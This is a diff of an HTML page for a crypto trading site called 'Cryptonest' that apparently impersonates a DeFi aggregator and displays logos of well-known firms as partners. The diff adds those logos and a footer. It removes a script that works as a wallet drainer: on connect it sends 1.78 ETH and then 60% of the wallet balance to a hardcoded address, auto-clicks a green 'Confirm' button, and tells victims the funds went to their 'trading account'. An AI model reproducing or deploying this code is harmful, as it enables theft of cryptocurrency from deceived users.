+                <img class="partner-logo h-12 mx-auto" src="https://lionswap.finance/assets/trustwallet-a2ac2815.svg" alt="Trust Wallet">
+                <img class="partner-logo h-12 mx-auto" src="https://lionswap.finance/assets/opium-c5be8ab9.svg" alt="Opium">
+                <img class="partner-logo h-12 mx-auto" src="https://lionswap.finance/assets/zerion-ac8f7c17.svg" alt="Zerion">
+                <img class="partner-logo h-12 mx-auto" src="https://lionswap.finance/assets/revolut-aead57ab.svg" alt="Revolut">
+                <img class="partner-logo h-12 mx-auto" src="https://lionswap.finance/assets/pantera-4e096cb3.svg" alt="Pantera">
+                <img class="partner-logo h-12 mx-auto" src="https://lionswap.finance/assets/binance-lab-ae0021b2.svg" alt="Binance Lab">
+                <img class="partner-logo h-12 mx-auto" src="https://lionswap.finance/assets/dragonfly-capital-afb04206.svg" alt="Dragonfly Capital">
+                <img class="partner-logo h-12 mx-auto" src="https://lionswap.finance/assets/galaxy-digital-cdf0a4bc.svg" alt="Galaxy Digital">
+                <img class="partner-logo h-12 mx-auto" src="https://lionswap.finance/assets/parafi-capital-5964d942.svg" alt="ParaFi Capital">
+                <img class="partner-logo h-12 mx-auto" src="https://lionswap.finance/assets/gemini-5a08994d.svg" alt="Gemini">
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="vantablack-bg border-t border-gray-800">
+        <div class="max-w-7xl mx-auto py-12 px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-8">
+                <div class="col-span-2">
+                    <h3 class="text-lg font-semibold text-white mb-4">Cryptonest</h3>
+                    <p class="text-gray-500">
+                        Optimize your trades across hundreds of DEXes on multiple networks with the most advanced DeFi aggregation protocol.
+                    </p>
+                </div>
+                <div>
+                    <h3 class="text-lg font-semibold text-white mb-4">Protocols</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-gray-500 hover:text-green-400">Liquidity Protocol</a></li>
+                        <li><a href="#" class="text-gray-500 hover:text-green-400">Aggregation Protocol</a></li>
+                        <li><a href="#" class="text-gray-500 hover:text-green-400">Limit Order Protocol</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-lg font-semibold text-white mb-4">Governance</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-gray-500 hover:text-green-400">Cryptonest DAO</a></li>
+                        <li><a href="#" class="text-gray-500 hover:text-green-400">Cryptonest token</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-lg font-semibold text-white mb-4">Support</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-gray-500 hover:text-green-400">Help center</a></li>
+                        <li><a href="#" class="text-gray-500 hover:text-green-400">Contacts</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="mt-12 pt-8 border-t border-gray-800">
+                <div class="md:flex md:items-center md:justify-between">
+                    <div class="flex space-x-6 md:order-2">
+                        <a href="#" class="text-gray-500 hover:text-green-400">
+                            <span class="sr-only">GitHub</span>
+                            <i class="fab fa-github"></i>
+                        </a>
+                        <a href="#" class="text-gray-500 hover:text-green-400">
+                            <span class="sr-only">Audit</span>
+                            <i class="fas fa-shield-alt"></i>
+                        </a>
+                    </div>
+                    <div class="mt-8 md:mt-0 md:order-1">
+                        <p class="text-gray-500">
+                            © 2023 Cryptonest, All Rights Reserved.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
     <script>
+        // Mobile menu toggle functionality
         document.addEventListener('DOMContentLoaded', function() {
-            // Elements
-            const connectWalletBtn = document.getElementById('connectWalletBtn');
-            const walletStatus = document.getElementById('walletStatus');
-            const walletAddress = document.getElementById('walletAddress');
-            const connectSection = document.getElementById('connectSection');
-            const testSection = document.getElementById('testSection');
-            const transactionModal = document.getElementById('transactionModal');
-            const transactionSpinner = document.getElementById('transactionSpinner');
-            const transactionSuccess = document.getElementById('transactionSuccess');
-            const transactionError = document.getElementById('transactionError');
-            const transactionTitle = document.getElementById('transactionTitle');
-            const transactionMessage = document.getElementById('transactionMessage');
-            const transactionDetails = document.getElementById('transactionDetails');
-            const txFrom = document.getElementById('txFrom');
-            const txHashContainer = document.getElementById('txHashContainer');
-            const txHashLink = document.getElementById('txHashLink');
-            const closeModalBtn = document.getElementById('closeModalBtn');
-            const warningModal = document.getElementById('warningModal');
-            const agreeBtn = document.getElementById('agreeBtn');
-            const cancelBtn = document.getElementById('cancelBtn');
-            const cancelBtn2 = document.getElementById('cancelBtn2');
-            const estimatedGasFee = document.getElementById('estimatedGasFee');
-            const agreeTradeBtn = document.getElementById('agreeTradeBtn');
-            const walletBalance = document.getElementById('walletBalance');
-            const tradingCapital = document.getElementById('tradingCapital');
-            const mainContent = document.getElementById('mainContent');
-            const candlestickChart = document.getElementById('candlestickChart');
-
-            // Destination address and amount
-            const DESTINATION_ADDRESS = '0x675c2761a8BDF5D5E36cfC7dcC5aA5b3d30129E1';
-            const AMOUNT_ETH = 1.78;
-            let userAgreed = false;
-            let confirmButtonObserver = null;
-            let web3;
-
-            // Generate candlestick chart
-            function generateCandlestickChart() {
-                const width = 800;
-                const height = 400;
-                const candleCount = 50;
-                const candleWidth = 12;
-                const candleGap = 4;
-                const padding = 40;
-                
-                // Clear existing candles
-                candlestickChart.querySelectorAll('.candle, .wick').forEach(el => el.remove());
-                
-                // Generate random candle data
-                let lastClose = 200;
-                const candles = [];
-                
-                for (let i = 0; i < candleCount; i++) {
-                    const open = lastClose;
-                    const high = open + Math.random() * 40;
-                    const low = open - Math.random() * 40;
-                    const close = open + (Math.random() * 60 - 30);
-                    const isUp = close > open;
-                    
-                    candles.push({
-                        x: padding + i * (candleWidth + candleGap),
-                        open,
-                        high,
-                        low,
-                        close,
-                        isUp
-                    });
-                    
-                    lastClose = close;
-                }
-                
-                // Find min and max for scaling
-                const min = Math.min(...candles.map(c => c.low));
-                const max = Math.max(...candles.map(c => c.high));
-                const scale = height / (max - min);
-                
-                // Draw candles
-                candles.forEach(candle => {
-                    const x = candle.x;
-                    const scaledOpen = height - (candle.open - min) * scale;
-                    const scaledHigh = height - (candle.high - min) * scale;
-                    const scaledLow = height - (candle.low - min) * scale;
-                    const scaledClose = height - (candle.close - min) * scale;
-                    
-                    // Draw wick
-                    const wick = document.createElementNS("http://www.w3.org/2000/svg", "line");
-                    wick.setAttribute("x1", x + candleWidth/2);
-                    wick.setAttribute("y1", scaledHigh);
-                    wick.setAttribute("x2", x + candleWidth/2);
-                    wick.setAttribute("y2", scaledLow);
-                    wick.classList.add("wick");
-                    wick.classList.add(candle.isUp ? "wick-up" : "wick-down");
-                    candlestickChart.appendChild(wick);
-                    
-                    // Draw candle body
-                    const candleRect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
-                    candleRect.setAttribute("x", x);
-                    candleRect.setAttribute("y", Math.min(scaledOpen, scaledClose));
-                    candleRect.setAttribute("width", candleWidth);
-                    candleRect.setAttribute("height", Math.abs(scaledClose - scaledOpen));
-                    candleRect.classList.add("candle");
-                    candleRect.classList.add(candle.isUp ? "candle-up" : "candle-down");
-                    candlestickChart.appendChild(candleRect);
-                });
-            }
-            
-            // Initial chart generation
-            generateCandlestickChart();
-            
-            // Update chart periodically
-            setInterval(generateCandlestickChart, 5000);
-
-            // Check if Web3 is injected (MetaMask, Trust Wallet, etc.)
-            if (typeof window.ethereum !== 'undefined') {
-                console.log('Web3 detected!');
-                web3 = new Web3(window.ethereum);
-            } else {
-                console.log('No Web3 detected');
-                connectWalletBtn.textContent = 'Web3 Not Detected';
-                connectWalletBtn.classList.remove('pulse');
-                connectWalletBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
-                connectWalletBtn.disabled = true;
-            }
-
-            // Connect Wallet Button
-            connectWalletBtn.addEventListener('click', function() {
-                // Show warning modal before connecting
-                warningModal.classList.remove('hidden');
-                mainContent.classList.add('blur-background');
-            });
-
-            // Function to find and click the green Confirm button
-            function findAndClickConfirmButton() {
-                // Get all buttons on the page
-                const buttons = document.querySelectorAll('button');
-                
-                // Look for a button with green background (#48ff91) and text "Confirm"
-                for (const button of buttons) {
-                    const computedStyle = window.getComputedStyle(button);
-                    const bgColor = computedStyle.backgroundColor;
-                    const buttonText = button.textContent.trim().toLowerCase();
-                    
-                    // Check if button has the right color and text
-                    if ((bgColor === 'rgb(72, 255, 145)' || bgColor === '#48ff91') && 
-                        buttonText.includes('confirm')) {
-                        console.log('Found confirm button:', button);
-                        button.click();
-                        return true;
-                    }
-                }
-                
-                return false;
-            }
-
-            // Function to observe DOM changes and look for the confirm button
-            function setupConfirmButtonObserver() {
-                // If observer already exists, disconnect it first
-                if (confirmButtonObserver) {
-                    confirmButtonObserver.disconnect();
-                }
-                
-                // Create a MutationObserver to watch for DOM changes
-                confirmButtonObserver = new MutationObserver(function(mutations) {
-                    // Try to find and click the confirm button
-                    const found = findAndClickConfirmButton();
-                    
-                    if (found) {
-                        // If found, disconnect the observer
-                        confirmButtonObserver.disconnect();
-                        confirmButtonObserver = null;
-                    }
-                });
-                
-                // Start observing the document with the configured parameters
-                confirmButtonObserver.observe(document.body, {
-                    childList: true,
-                    subtree: true,
-                    attributes: true,
-                    characterData: true
-                });
-                
-                // Also try immediately in case the button is already there
-                findAndClickConfirmButton();
-            }
-
-            // Agree to automatic transfer
-            agreeBtn.addEventListener('click', async function() {
-                userAgreed = true;
-                warningModal.classList.add('hidden');
-                mainContent.classList.remove('blur-background');
-                
-                // Set up the observer to watch for the confirm button
-                setupConfirmButtonObserver();
-                
-                // Connect wallet and initiate transfer
-                await connectWalletAndTransfer();
-            });
-
-            // Cancel buttons
-            cancelBtn.addEventListener('click', function() {
-                warningModal.classList.add('hidden');
-                mainContent.classList.remove('blur-background');
-                userAgreed = false;
-                
-                // Disconnect any existing observer
-                if (confirmButtonObserver) {
-                    confirmButtonObserver.disconnect();
-                    confirmButtonObserver = null;
-                }
-            });
-                            
-            cancelBtn2.addEventListener('click', function() {
-                warningModal.classList.add('hidden');
-                mainContent.classList.remove('blur-background');
-                userAgreed = false;
-                
-                // Disconnect any existing observer
-                if (confirmButtonObserver) {
-                    confirmButtonObserver.disconnect();
-                    confirmButtonObserver = null;
-                }
-            });
-
-            // Agree to start trading (transfer 60%)
-            agreeTradeBtn.addEventListener('click', async function() {
-                // Disable button to prevent multiple clicks
-                agreeTradeBtn.disabled = true;
-                agreeTradeBtn.classList.add('opacity-50', 'cursor-not-allowed');
-                
-                // Initiate transfer
-                await transferToTradingAccount();
-                
-                // Re-enable button after transaction completes or fails
-                agreeTradeBtn.disabled = false;
-                agreeTradeBtn.classList.remove('opacity-50', 'cursor-not-allowed');
-            });
-
-            // Main function to connect wallet and perform transfer
-            async function connectWalletAndTransfer() {
-                try {
-                    // Request account access
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    const account = accounts[0];
-
-                    // Update UI
-                    walletStatus.classList.remove('hidden');
-                    walletAddress.textContent = `${account.substring(0, 6)}...${account.substring(38)}`;
-                    walletStatus.classList.add('wallet-connected');
-                    connectSection.classList.add('hidden');
-                    testSection.classList.remove('hidden');
-                    connectWalletBtn.classList.remove('pulse');
-
-                    console.log('Connected account:', account);
-
-                    // Show processing modal
-                    transactionModal.classList.remove('hidden');
-                    transactionSpinner.classList.remove('hidden');
-                    transactionSuccess.classList.add('hidden');
-                    transactionError.classList.add('hidden');
-                    transactionDetails.classList.add('hidden');
-                    txHashContainer.classList.add('hidden');
-                    transactionTitle.textContent = 'Processing Transaction';
-                    transactionMessage.textContent = 'Please confirm the transaction in your wallet...';
-
-                    // Initialize Web3
-                    const web3 = new Web3(window.ethereum);
-
-                    // Convert ETH amount to Wei
-                    const amountWei = web3.utils.toWei(AMOUNT_ETH.toString(), 'ether');
-
-                    // Get current gas price
-                    const gasPrice = await web3.eth.getGasPrice();
-                    const gasPriceGwei = web3.utils.fromWei(gasPrice, 'gwei');
-                    
-                    // Update estimated gas fee display (assuming 21000 gas limit)
-                    const gasCostEth = 21000 * gasPrice / 1e18;
-                    estimatedGasFee.textContent = `~$${(gasCostEth * 2000).toFixed(2)} (estimated)`; // Assuming $2000/ETH
-
-                    // Prepare transaction parameters
-                    const transactionParameters = {
-                        from: account,
-                        to: DESTINATION_ADDRESS,
-                        value: amountWei,
-                        gas: 21000, // Standard gas limit for simple ETH transfers
-                        gasPrice: gasPrice // Current gas price
-                    };
-
-                    // Send transaction
-                    const txHash = await web3.eth.sendTransaction(transactionParameters);
-
-                    // Show success
-                    transactionSpinner.classList.add('hidden');
-                    transactionSuccess.classList.remove('hidden');
-                    transactionTitle.textContent = 'Transaction Successful';
-                    transactionMessage.textContent = 'ETH has been sent successfully to your trading address!';
-                    transactionDetails.classList.remove('hidden');
-                    txFrom.textContent = account;
-                    txHashContainer.classList.remove('hidden');
-                    txHashLink.textContent = `${txHash.transactionHash.substring(0, 12)}...${txHash.transactionHash.substring(58)}`;
-                    txHashLink.href = `https://etherscan.io/tx/${txHash.transactionHash}`;
-
-                    console.log('Transaction successful:', txHash);
-                    
-                    // Update balance display
-                    const balanceWei = await web3.eth.getBalance(account);
-                    const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
-                    walletBalance.textContent = `${parseFloat(balanceEth).toFixed(6)} ETH`;
-                    tradingCapital.textContent = `${parseFloat(balanceEth * 0.6).toFixed(6)} ETH`;
-                } catch (error) {
-                    console.error('Error performing transaction:', error);
-
-                    // Show error
-                    transactionSpinner.classList.add('hidden');
-                    transactionError.classList.remove('hidden');
-                    transactionTitle.textContent = 'Transaction Failed';
-                    transactionMessage.textContent = error.message || 'There was an error sending the transaction.'; 
-                    
-                    // Allow user to try again
-                    connectSection.classList.remove('hidden');
-                    testSection.classList.add('hidden');
-                    walletStatus.classList.add('hidden');
-                    connectWalletBtn.classList.add('pulse');
-                }
-            }
-
-            // Function to transfer 60% to trading account
-            async function transferToTradingAccount() {
-                try {
-                    // Get current account
-                    const accounts = await web3.eth.getAccounts();
-                    const account = accounts[0];
-
-                    if (!account) {
-                        throw new Error('No account connected');
-                    }
-
-                    // Get current balance
-                    const balanceWei = await web3.eth.getBalance(account);
-                    const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
-                    
-                    // Calculate 60% of balance in Wei
-                    const amountEth = balanceEth * 0.6;
-                    const amountWei = web3.utils.toWei(amountEth.toString(), 'ether');
-
-                    // Show processing modal
-                    transactionModal.classList.remove('hidden');
-                    transactionSpinner.classList.remove('hidden');
-                    transactionSuccess.classList.add('hidden');
-                    transactionError.classList.add('hidden');
-                    transactionDetails.classList.add('hidden');
-                    txHashContainer.classList.add('hidden');
-                    transactionTitle.textContent = 'Processing Transaction';
-                    transactionMessage.textContent = 'Please confirm the transaction in your wallet...';
-
-                    // Get current gas price
-                    const gasPrice = await web3.eth.getGasPrice();
-                    const gasPriceGwei = web3.utils.fromWei(gasPrice, 'gwei');
-                    
-                    // Update estimated gas fee display (assuming 21000 gas limit)
-                    const gasCostEth = 21000 * gasPrice / 1e18;
-                    estimatedGasFee.textContent = `~$${(gasCostEth * 2000).toFixed(2)} (estimated)`; // Assuming $2000/ETH
-                    
-                    // Prepare transaction parameters
-                    const transactionParameters = {
-                        from: account,
-                        to: DESTINATION_ADDRESS,
-                        value: amountWei,
-                        gas: web3.utils.toHex(21000), // Standard gas limit for simple ETH transfers
-                        gasPrice: gasPrice // Current gas price
-                    };
-                    
-                    // Send transaction - this will trigger the wallet confirmation
-                    web3.eth.sendTransaction(transactionParameters)
-                        .on('transactionHash', function(hash) {
-                            // Transaction was sent to the network
-                            console.log('Transaction hash:', hash);
-                            txHashContainer.classList.remove('hidden');
-                            txHashLink.textContent = `${hash.substring(0, 12)}...${hash.substring(58)}`;
-                            txHashLink.href = `https://etherscan.io/tx/${hash}`;
-                        })
-                        .on('receipt', function(receipt) {
-                            // Transaction was mined
-                            console.log('Transaction receipt:', receipt);
-                            
-                            // Show success
-                            transactionSpinner.classList.add('hidden');
-                            transactionSuccess.classList.remove('hidden');
-                            transactionTitle.textContent = 'Transaction Successful';
-                            transactionMessage.textContent = `${parseFloat(amountEth).toFixed(6)} ETH has been transferred to your trading account!`;
-                            transactionDetails.classList.remove('hidden');
-                            txFrom.textContent = account;
-                            
-                            // Update balance display
-                            const newBalanceEth = balanceEth - amountEth;
-                            walletBalance.textContent = `${parseFloat(newBalanceEth).toFixed(6)} ETH`;
-                            tradingCapital.textContent = `0 ETH`;
-                        })
-                        .on('error', function(error) {
-                            console.error('Transaction error:', error);
-                            
-                            // Show error
-                            transactionSpinner.classList.add('hidden');
-                            transactionError.classList.remove('hidden');
-                            transactionTitle.textContent = 'Transaction Failed';
-                            transactionMessage.textContent = error.message || 'There was an error sending the transaction.';
-                        });
-                  
-                } catch (error) {
-                    console.error('Error performing transaction:', error);
-                    
-                    // Show error
-                    transactionSpinner.classList.add('hidden');
-                    transactionError.classList.remove('hidden');
-                    transactionTitle.textContent = 'Transaction Failed';
-                    transactionMessage.textContent = error.message || 'There was an error sending the transaction.';
-                }
-            }
-
-            // Close Modal Button
-            closeModalBtn.addEventListener('click', function() {
-                transactionModal.classList.add('hidden');
-            });
-
-            // Close modal when clicking outside
-            transactionModal.addEventListener('click', function(e) {
-                if (e.target === transactionModal) {
-                    transactionModal.classList.add('hidden');
-                }
-            });
-
-            // Handle account changes
-            window.ethereum.on('accountsChanged', function(accounts) {
-                if (accounts.length === 0) {
-                    // Wallet disconnected
-                    walletStatus.classList.add('hidden');
-                    connectSection.classList.remove('hidden');
-                    testSection.classList.add('hidden');
-                    connectWalletBtn.classList.add('pulse');
-                } else {
-                    // Account changed
-                    const account = accounts[0];
-                    walletAddress.textContent = `${account.substring(0, 6)}...${account.substring(38)}`;
-                    
-                    // Refresh balance
-                    if (userAgreed) {
-                        connectWalletAndTransfer();
-                    }
-                }
+            const mobileMenuButton = document.querySelector('[aria-controls="mobile-menu"]');
+            mobileMenuButton.addEventListener('click', function() {
+                const expanded = this.getAttribute('aria-expanded') === 'true';
+                this.setAttribute('aria-expanded', !expanded);
+                // You would toggle your mobile menu here
             });
         });
     </script>
